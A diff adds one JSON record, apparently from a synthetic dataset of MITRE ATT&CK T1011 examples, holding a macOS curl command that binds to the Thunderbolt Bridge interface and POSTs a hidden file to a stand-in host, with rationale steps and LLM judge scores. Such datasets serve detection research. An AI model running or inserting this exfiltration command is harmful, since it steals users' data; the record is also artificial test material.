@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
+  "explanation": "Uses the Thunderbolt Bridge interface for HTTP POST exfiltration by explicitly binding curl to that alternate medium (T1011).",
+  "rationale_steps": [
+    "Fetch Thunderbolt Bridge IP with networksetup",
+    "Bind curl to the Thunderbolt interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f3051136",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid curl flags, and correct command substitution/awk usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a file via HTTP POST bound to the Thunderbolt Bridge IP using curl\u2019s --interface, but success depends on that interface having a valid routable IP and the specified endpoint being reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T22:31:48.080925Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
